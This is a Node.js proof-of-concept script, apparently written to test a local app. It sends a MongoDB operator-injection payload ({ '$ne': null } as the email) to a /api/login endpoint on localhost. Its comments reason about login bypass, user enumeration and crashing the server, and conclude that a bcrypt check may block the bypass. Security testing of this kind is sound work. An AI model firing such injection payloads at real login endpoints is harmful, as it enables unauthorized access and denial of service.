const http = require('http');

// This script aims to Exploit the NoSQL Injection vulnerability in the Login endpoint.
// It sends a JSON payload where 'email' is NOT a string, but an object: { "$ne": null }.
// In MongoDB, { "$ne": null } matches anything that is not null (basically all users).
// If successful, it logs us in as the FIRST user it finds, without needing a valid email or password.

const payload = JSON.stringify({
    email: { "$ne": null },
    password: "randomPassword123" // Password shouldn't matter if we bypass the email check poorly, 
    // BUT server.js checks password separately:
    // const user = await User.findOne({ email });
    // const isMatch = await bcrypt.compare(password, user.password);
    //
    // WAIT: server.js Logic:
    // 1. const user = await User.findOne({ email });
    // -> This returns the *first* user found (usually the first registered).
    // 2. if (!user) ...
    // 3. const isMatch = await bcrypt.compare(password, user.password);
    //
    // Ah! So even if we find the user, bcrypt.compare will FAIL because "randomPassword123" won't match.
    // SO: A standard "login bypass" might NOT work here purely with { $ne: null } on email
    // UNLESS we also inject the password check OR if the code logic was different.
    //
    // HOWEVER, let's verify if we can at least ENUMERATE that a user exists.
    // If the response is "Invalid credentials" (400), it means either User Not Found OR Password Wrong.
    // server.js returns the SAME message for both.
    //
    // Let's try to Bypass the PASSWORD check? 
    // bcrypt.compare(password, user.password). 
    // We can't easily inject into `user.password` here because `user` comes from DB.
    // We can't inject into `password` argument of compare easily to make it always true.
    //
    // BUT, can we Blind NoSQL Injection? 
    // We can find if a user exists. 
    // Also, if we send { email: { $gt: "" } }, we might crash it if it expects a string?
    //
    // Actually, the vulnerability exists:
    // const user = await User.findOne({ email });
    // This allows us to extract data if we wanted to, or DoS.
    // But a simple Login Bypass might be blocked by the subsequent bcrypt check.
    //
    // LET'S SEE WHAT HAPPENS.
    // If I get "Invalid credentials", it means it FOUND a user (or not) but failed password.
    // To distinguish, I need to see if the error is different? No, same message.
    //
    // What if I try to register a user that allows me to login?
    //
    // Alternative: server.js:31 -> `if (!name || ...)` 
    // `req.body` is taken directly.
    //
    // Let's just demonstrate that we can pass an object and backend accepts it.
    // I'll modify the script to print the Status Code and Message.
    // If it crashes (500), that's also a vulerability.
});

// We'll trust the user has at least one user in DB.

const options = {
    hostname: 'localhost',
    port: 5000,
    path: '/api/login',
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
        'Content-Length': payload.length
    }
};

console.log("Attempting NoSQL Injection on /api/login...");
console.log("Payload:", payload);

const req = http.request(options, (res) => {
    let data = '';

    res.on('data', (chunk) => {
        data += chunk;
    });

    res.on('end', () => {
        console.log(`\nStatus Code: ${res.statusCode}`);
        console.log(`Response Body: ${data}`);

        if (res.statusCode === 200) {
            console.log("!!! VULNERABILITY CONFIRMED: Logged in successfully! !!!");
        } else if (res.statusCode === 500) {
            console.log("!!! VULNERABILITY CONFIRMED: Server Crashed (DoS)! !!!");
        } else {
            console.log("Request failed (as expected if bcrypt holds up, or if sanitized).");
            console.log("If sanitized, we expect 'Invalid credentials' but the server log shouldn't show a weird object query.");
        }
    });
});

req.on('error', (error) => {
    console.error(error);
});

req.write(payload);
req.end();